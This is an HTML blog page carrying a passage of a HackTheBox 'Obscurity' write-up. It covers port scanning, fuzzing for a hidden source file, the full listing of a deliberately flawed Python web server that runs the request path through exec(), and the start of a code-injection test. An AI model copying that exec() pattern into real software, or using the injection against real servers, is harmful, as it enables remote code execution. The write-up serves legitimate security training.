<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="Just finished the newly released Obscurity box on Hackthbox. I have to say it was a really cool box that required a lot of custom exploitation and cover various topics such as command injection, a">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox - Obscurity">
<meta property="og:url" content="https://hg8.sh/posts/obscurity/index.html">
<meta property="og:site_name" content="hg8&#39;s Notes — My notes about infosec world. Pentest&#x2F;Bug Bounty&#x2F;CTF Writeups.">
<meta property="og:description" content="Just finished the newly released Obscurity box on Hackthbox. I have to say it was a really cool box that required a lot of custom exploitation and cover various topics such as command injection, a">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/82158295-30812b80-9887-11ea-970a-935c37992678.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/71549328-fee0f400-29bb-11ea-9df7-81ea1b4d4ae6.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/72752623-f6e33100-3bc2-11ea-92b6-a025983eb467.png">
<meta property="article:published_time" content="2020-05-08T22:00:00.000Z">
<meta property="article:modified_time" content="2020-05-18T13:17:38.692Z">
<meta property="article:author" content="hg8">
<meta property="article:tag" content="python">
<meta property="article:tag" content="obscurity">
<meta property="article:tag" content="custom-exploitation">
<meta property="article:tag" content="encryption">
<meta property="article:tag" content="re">
<meta property="article:tag" content="john">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://user-images.githubusercontent.com/9076747/82158295-30812b80-9887-11ea-970a-935c37992678.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
     
    <title>HackTheBox - Obscurity :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="hg8's Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups." type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" href="/posts/pwnable/fd/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
    </span>
    <br/>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">1.</span> <span class="toc-text">User Flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">2.</span> <span class="toc-text">Recon</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Remote-Code-Execution-gt-www-data-shell"><span class="toc-number">2.1.</span> <span class="toc-text">Remote Code Execution -&gt; www-data shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-www-data-gt-Robert"><span class="toc-number">2.2.</span> <span class="toc-text">Pivot www-data -&gt; Robert</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Recovering-the-secret-key"><span class="toc-number">2.3.</span> <span class="toc-text">Recovering the secret key</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-Flag"><span class="toc-number">3.</span> <span class="toc-text">Root Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">3.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cracking-Root-password-hash"><span class="toc-number">3.2.</span> <span class="toc-text">Cracking Root password hash</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        <header id="header">
  <a href="/">
  
      <div id="logo" style="background-image: url(/images/logo.png);"></div>
  
    <span class="logo__mark"></span>
    <span class="logo__text">./hg8.sh</span>
    <span class="logo__cursor"></span>
  </a>
  <div id="nav">
    <ul>
      <li class="icon">
        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
      </li>
       
        <li><a href="/">Home</a></li>
       
        <li><a href="/about/">About</a></li>
       
        <li><a href="/archives/">Posts</a></li>
       
        <li><a href="/search/">Search</a></li>
      
    </ul>
  </div>
</header>

        
          <br>
          <br>
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        HackTheBox - Obscurity
    </h1>



    <div class="meta"> 
      
    <div class="postdate">
      
        <time datetime="2020-05-08T22:00:00.000Z" itemprop="datePublished">09-05-2020</time>
        
      
    </div>


      — Written by 
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">hg8</span>
      </span>
      —
      20 min read
    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <img width="587" alt="obscurity-hackthebox" src="https://user-images.githubusercontent.com/9076747/82158295-30812b80-9887-11ea-970a-935c37992678.png">


<p>Just finished the newly released Obscurity box on Hackthbox. I have to say it was a really cool box that required a lot of custom exploitation and cover various topics such as command injection, a little crypto and misconfigurations. I wouldn’t say it’s an easy one but it’s a pretty good one for developers comfortable with Python and want to level up in CTF.</p>
<p><strong>Tl;Dr:</strong> The user flag consisted in grabbing the source code of the server running port 80, “reverse engineer” it to find a command injection flaw in its workflow. From there you achieve remote code execution as <code>www-data</code>. As <code>www-data</code> you can access <code>Robert</code> user <code>/home/</code> directory filed with a encrypted password reminder file and a “homemade” python encryption script. Reversing this script you can recover the password used to encrypt the password reminder file. Once decrypted you use this password in the file to pivot to <code>Robert</code> user and grab the flag.<br>The root flag was accessible by abusing another homemade python script used to get a shell as root, when reverse engineer it you discover the script temporary store all users password hashes to the <code>/tmp</code> folder when running but immediately deletes them. You can write a script to grab the hashes fast enough before they get deleted, crack the hash of root and connect with the <code>root</code> account to grab the flag.</p>
<p>Alright! Let’s get into the details now!</p>
<hr>
<p>First thing first, let’s add the box IP to the host file:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"10.10.10.168 obscurity.htb"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>

<p>and let’s start!</p>
<h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -sV -sT -sC obscurity.htb</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-26 09:56 CET</span><br><span class="line">Nmap scan report <span class="keyword">for</span> obscurity.htb (10.10.10.168)</span><br><span class="line">Host is up (0.038s latency).</span><br><span class="line">Not shown: 996 filtered ports</span><br><span class="line">PORT     STATE  SERVICE    VERSION</span><br><span class="line">22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   closed http</span><br><span class="line">8080/tcp open   http-proxy BadHTTPServer</span><br><span class="line">9000/tcp closed cslistener</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 16.09 seconds</span><br></pre></td></tr></table></figure>

<p>Bit less classic than usual, port 80 is closed, <code>nmap</code> return 9000 port which is closed (no idea what this is so we keep it in mind for later maybe).<br>The ssh port 22 is open and the 8080 one running <code>BadHTTPServer</code>… Intriguing.  </p>
<p>Let’s dig it on this “bad” server.<br>Opening <code>http://obsurity.htb:8080/</code> display the following website: </p>
<p><img src="https://user-images.githubusercontent.com/9076747/71549328-fee0f400-29bb-11ea-9df7-81ea1b4d4ae6.png" alt="obscurity"></p>
<p>Looking around we notice this interesting message:</p>
<blockquote>
<p>Message to server devs: the current source code for the web server is in ‘SuperSecureServer.py’ in the secret development directory.  </p>
</blockquote>
<p>Well, since we don’t have other entry point yet, let’s try to bruteforce our way to find this “secret” directory name.   </p>
<p>This time I decided to give <a href="https://github.com/ffuf/ffuf" target="_blank" rel="noopener"><code>ffuf</code></a> (“a fast web fuzzer written in Go”) a try. It’s usage is pretty straightforward and similar to <code>wfuzz</code>.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ffuf -w ~/SecLists/Discovery/Web-Content/big.txt -u <span class="string">"http://obscurity.htb:8080/FUZZ/SuperSecureServer.py"</span></span><br><span class="line">        /<span class="string">'___\  /'</span>___\           /<span class="string">'___\</span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/</span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\</span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/</span></span><br><span class="line"><span class="string">       v1.0-rc1</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://obscurity.htb:8080/FUZZ/SuperSecureServer.py</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string">develop                 [Status: 200, Size: 5892, Words: 1806, Lines: 171]</span></span><br><span class="line"><span class="string">:: Progress: [20470/20470] :: 222 req/sec :: Duration: [0:01:32] :: Errors: 0 ::</span></span><br></pre></td></tr></table></figure>

<p>Got it! The secret directory was <code>develop</code>. </p>
<p>Let’s open this <code>SuperSecureServer.py</code> to take a look:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> mimetypes</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">respTemplate = <span class="string">"""HTTP/1.1 &#123;statusNum&#125; &#123;statusCode&#125;</span></span><br><span class="line"><span class="string">Date: &#123;dateSent&#125;</span></span><br><span class="line"><span class="string">Server: &#123;server&#125;</span></span><br><span class="line"><span class="string">Last-Modified: &#123;modified&#125;</span></span><br><span class="line"><span class="string">Content-Length: &#123;length&#125;</span></span><br><span class="line"><span class="string">Content-Type: &#123;contentType&#125;</span></span><br><span class="line"><span class="string">Connection: &#123;connectionType&#125;</span></span><br><span class="line"><span class="string">&#123;body&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">DOC_ROOT = <span class="string">"DocRoot"</span></span><br><span class="line">CODES = &#123;<span class="string">"200"</span>: <span class="string">"OK"</span>,</span><br><span class="line">        <span class="string">"304"</span>: <span class="string">"NOT MODIFIED"</span>,</span><br><span class="line">        <span class="string">"400"</span>: <span class="string">"BAD REQUEST"</span>, <span class="string">"401"</span>: <span class="string">"UNAUTHORIZED"</span>, <span class="string">"403"</span>: <span class="string">"FORBIDDEN"</span>, <span class="string">"404"</span>: <span class="string">"NOT FOUND"</span>,</span><br><span class="line">        <span class="string">"500"</span>: <span class="string">"INTERNAL SERVER ERROR"</span>&#125;</span><br><span class="line">MIMES = &#123;<span class="string">"txt"</span>: <span class="string">"text/plain"</span>, <span class="string">"css"</span>:<span class="string">"text/css"</span>, <span class="string">"html"</span>:<span class="string">"text/html"</span>, <span class="string">"png"</span>: <span class="string">"image/png"</span>, <span class="string">"jpg"</span>:<span class="string">"image/jpg"</span>,</span><br><span class="line">        <span class="string">"ttf"</span>:<span class="string">"application/octet-stream"</span>,<span class="string">"otf"</span>:<span class="string">"application/octet-stream"</span>, <span class="string">"woff"</span>:<span class="string">"font/woff"</span>, <span class="string">"woff2"</span>: <span class="string">"font/woff2"</span>,</span><br><span class="line">        <span class="string">"js"</span>:<span class="string">"application/javascript"</span>,<span class="string">"gz"</span>:<span class="string">"application/zip"</span>, <span class="string">"py"</span>:<span class="string">"text/plain"</span>, <span class="string">"map"</span>: <span class="string">"application/octet-stream"</span>&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Response</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, **kwargs)</span>:</span></span><br><span class="line">        self.__dict__.update(kwargs)</span><br><span class="line">        now = datetime.now()</span><br><span class="line">        self.dateSent = self.modified = now.strftime(<span class="string">"%a, %d %b %Y %H:%M:%S"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">stringResponse</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> respTemplate.format(**self.__dict__)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, request)</span>:</span></span><br><span class="line">        self.good = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            request = self.parseRequest(request)</span><br><span class="line">            self.method = request[<span class="string">"method"</span>]</span><br><span class="line">            self.doc = request[<span class="string">"doc"</span>]</span><br><span class="line">            self.vers = request[<span class="string">"vers"</span>]</span><br><span class="line">            self.header = request[<span class="string">"header"</span>]</span><br><span class="line">            self.body = request[<span class="string">"body"</span>]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            self.good = <span class="literal">False</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parseRequest</span><span class="params">(self, request)</span>:</span></span><br><span class="line">        req = request.strip(<span class="string">"\r"</span>).split(<span class="string">"\n"</span>)</span><br><span class="line">        method,doc,vers = req[<span class="number">0</span>].split(<span class="string">" "</span>)</span><br><span class="line">        header = req[<span class="number">1</span>:<span class="number">-3</span>]</span><br><span class="line">        body = req[<span class="number">-1</span>]</span><br><span class="line">        headerDict = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> param <span class="keyword">in</span> header:</span><br><span class="line">            pos = param.find(<span class="string">": "</span>)</span><br><span class="line">            key, val = param[:pos], param[pos+<span class="number">2</span>:]</span><br><span class="line">            headerDict.update(&#123;key: val&#125;)</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">"method"</span>: method, <span class="string">"doc"</span>: doc, <span class="string">"vers"</span>: vers, <span class="string">"header"</span>: headerDict, <span class="string">"body"</span>: body&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Server</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, host, port)</span>:</span></span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        self.sock.bind((self.host, self.port))</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">listen</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.sock.listen(<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            client, address = self.sock.accept()</span><br><span class="line">            client.settimeout(<span class="number">60</span>)</span><br><span class="line">            threading.Thread(target = self.listenToClient,args = (client,address)).start()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">listenToClient</span><span class="params">(self, client, address)</span>:</span></span><br><span class="line">        size = <span class="number">1024</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data = client.recv(size)</span><br><span class="line">                <span class="keyword">if</span> data:</span><br><span class="line">                    <span class="comment"># Set the response to echo back the recieved data</span></span><br><span class="line">                    req = Request(data.decode())</span><br><span class="line">                    self.handleRequest(req, client, address)</span><br><span class="line">                    client.shutdown()</span><br><span class="line">                    client.close()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">raise</span> error(<span class="string">'Client disconnected'</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                client.close()</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handleRequest</span><span class="params">(self, request, conn, address)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> request.good:</span><br><span class="line"></span><br><span class="line"><span class="comment"># try:</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># print(str(request.method) + " " + str(request.doc), end=' ')</span></span><br><span class="line">                <span class="comment"># print("from &#123;0&#125;".format(address[0]))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># except Exception as e:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(e)</span></span><br><span class="line"></span><br><span class="line">            document = self.serveDoc(request.doc, DOC_ROOT)</span><br><span class="line">            statusNum=document[<span class="string">"status"</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            document = self.serveDoc(<span class="string">"/errors/400.html"</span>, DOC_ROOT)</span><br><span class="line">            statusNum=<span class="string">"400"</span></span><br><span class="line">        body = document[<span class="string">"body"</span>]</span><br><span class="line">        statusCode=CODES[statusNum]</span><br><span class="line">        dateSent = <span class="string">""</span></span><br><span class="line">        server = <span class="string">"BadHTTPServer"</span></span><br><span class="line">        modified = <span class="string">""</span></span><br><span class="line">        length = len(body)</span><br><span class="line">        contentType = document[<span class="string">"mime"</span>] <span class="comment"># Try and identify MIME type from string</span></span><br><span class="line">        connectionType = <span class="string">"Closed"</span></span><br><span class="line">        resp = Response(</span><br><span class="line">        statusNum=statusNum, statusCode=statusCode,</span><br><span class="line">        dateSent = dateSent, server = server,</span><br><span class="line">        modified = modified, length = length,</span><br><span class="line">        contentType = contentType, connectionType = connectionType,</span><br><span class="line">        body = body</span><br><span class="line">        )</span><br><span class="line">        data = resp.stringResponse()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">        conn.send(data.encode())</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">serveDoc</span><span class="params">(self, path, docRoot)</span>:</span></span><br><span class="line">        path = urllib.parse.unquote(path)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            info = <span class="string">"output = 'Document: &#123;&#125;'"</span> <span class="comment"># Keep the output for later debug</span></span><br><span class="line">            exec(info.format(path)) <span class="comment"># This is how you do string formatting, right?</span></span><br><span class="line">            cwd = os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">            docRoot = os.path.join(cwd, docRoot)</span><br><span class="line">            <span class="keyword">if</span> path == <span class="string">"/"</span>:</span><br><span class="line">                path = <span class="string">"/index.html"</span></span><br><span class="line">            requested = os.path.join(docRoot, path[<span class="number">1</span>:])</span><br><span class="line">            <span class="keyword">if</span> os.path.isfile(requested):</span><br><span class="line">                mime = mimetypes.guess_type(requested)</span><br><span class="line">                mime = (mime <span class="keyword">if</span> mime[<span class="number">0</span>] != <span class="literal">None</span> <span class="keyword">else</span> <span class="string">"text/html"</span>)</span><br><span class="line">                mime = MIMES[requested.split(<span class="string">"."</span>)[<span class="number">-1</span>]]</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">with</span> open(requested, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">                        data = f.read()</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">with</span> open(requested, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">                        data = f.read()</span><br><span class="line">                status = <span class="string">"200"</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                errorPage = os.path.join(docRoot, <span class="string">"errors"</span>, <span class="string">"404.html"</span>)</span><br><span class="line">                mime = <span class="string">"text/html"</span></span><br><span class="line">                <span class="keyword">with</span> open(errorPage, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    data = f.read().format(path)</span><br><span class="line">                status = <span class="string">"404"</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">            errorPage = os.path.join(docRoot, <span class="string">"errors"</span>, <span class="string">"500.html"</span>)</span><br><span class="line">            mime = <span class="string">"text/html"</span></span><br><span class="line">            <span class="keyword">with</span> open(errorPage, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">                data = f.read()</span><br><span class="line">            status = <span class="string">"500"</span></span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">"body"</span>: data, <span class="string">"mime"</span>: mime, <span class="string">"status"</span>: status&#125;</span><br></pre></td></tr></table></figure>

<p>The source code is worth reading, taking a bit of time to understand give some really interesting insight on the working of this http server.</p>
<h3 id="Remote-Code-Execution-gt-www-data-shell"><a href="#Remote-Code-Execution-gt-www-data-shell" class="headerlink" title="Remote Code Execution -&gt; www-data shell"></a>Remote Code Execution -&gt; www-data shell</h3><p>If you are used to python development (and ctf…), a line should quickly catch your eye:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(info.format(path))</span><br></pre></td></tr></table></figure>

<p>As a reminded <a href="https://docs.python.org/3/library/functions.html#exec" target="_blank" rel="noopener"><code>exec()</code></a> dynamically execute Python code passed as argument.<br>Like <code>eval()</code> it’s usage is <a href="https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html" target="_blank" rel="noopener">dangerous</a> and open door to injections.  </p>
<p>Let’s see if we can use this flow to achieve remote code execution on the server.<br>Can we inject code in <code>info</code> variable ?</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info = <span class="string">"output = 'Document: &#123;&#125;'"</span></span><br></pre></td></tr></table></figure>

<p>Nope… <code>path</code> then?</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parseRequest</span><span class="params">(self, request)</span>:</span></span><br><span class="line">    req = request.strip(<span class="string">"\r"</span>).split(<span class="string">"\n"</span>)</span><br><span class="line">    method,doc,vers = req[<span class="number">0</span>].split(<span class="string">" "</span>)</span><br><span class="line">[...]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handleRequest</span><span class="params">(self, request, conn, address)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.good:</span><br><span class="line">        document = self.serveDoc(request.doc, DOC_ROOT)</span><br><span class="line">[...]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">serveDoc</span><span class="params">(self, path, docRoot)</span>:</span></span><br><span class="line">    path = urllib.parse.unquote(path)</span><br></pre></td></tr></table></figure>

<p>As we could have have guess <code>path</code> contains the url requested to the server and, good news for us, no sanitization is being made.  </p>
<p>In the same way as SQL injection, let’s try to inject Python code that will lead to remote code injection on the server.</p>
<p>Let’s create a simplified script to do so with information we have:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">path = input(<span class="string">"Command to execute: "</span>)</span><br><span class="line">info = <span class="string">"output = 'Document: &#123;&#125;'"</span></span><br><span class="line">print(info.format(path))</span><br></pre></td></tr></table></figure>

<p>So let’s see what would happen if we pass an <code>os</code> command as path? Let’s try with <code>os.system(&#39;sleep 5&#39;)</code></p>
